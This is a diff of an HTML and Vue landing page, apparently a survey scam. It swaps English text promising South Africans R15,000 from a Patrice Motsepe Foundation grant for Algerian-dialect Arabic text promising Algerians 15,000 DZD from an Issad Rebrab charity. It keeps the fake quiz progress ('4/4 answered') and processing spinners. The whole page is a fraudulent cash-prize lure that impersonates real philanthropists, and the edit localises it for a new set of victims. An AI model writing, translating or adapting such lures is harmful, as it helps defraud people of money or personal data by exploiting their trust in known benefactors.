@@ -344,9 +344,13 @@ Ok
 Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>PYEI 2025 and Patrice Motsepe Foundation Grant Program: R15000 CASH FOR SOUTH AFRICANS </b>, Accept this EMPOWERMENT Opportunity of R15000 cash as a SOUTH AFRICAN and start your year in style.
+مرحبًا بكم في برنامج منحة مؤسسة الخير لإيساد ربراب: 15,000 دج كاش لكل الجزائريين. اغتنموا فرصة الدعم هاذي و استفادوا من 15,000 دج كاش كجزائري، و بداوا العام تاعكم بطريقة مميزة!
+
+
 <br>
-Answer the questions below to claim <b>R15000 Cash Prize</b>
+جاوب على الأسئلة اللي تحت باش تستفاد من جائزة دعم نقدية بقيمة 15,000 دج
+
+
 </p>
   <br>
   
@@ -357,19 +361,19 @@ Answer the questions below to claim <b>R15000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "صبر شوية برك...",
+              "صبر شوية برك...",
+              "صبر شوية برك..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+جاوبت على 4/4 من الأسئلة.
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+الإجابات تاعك راهي تحت المعالجة.
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
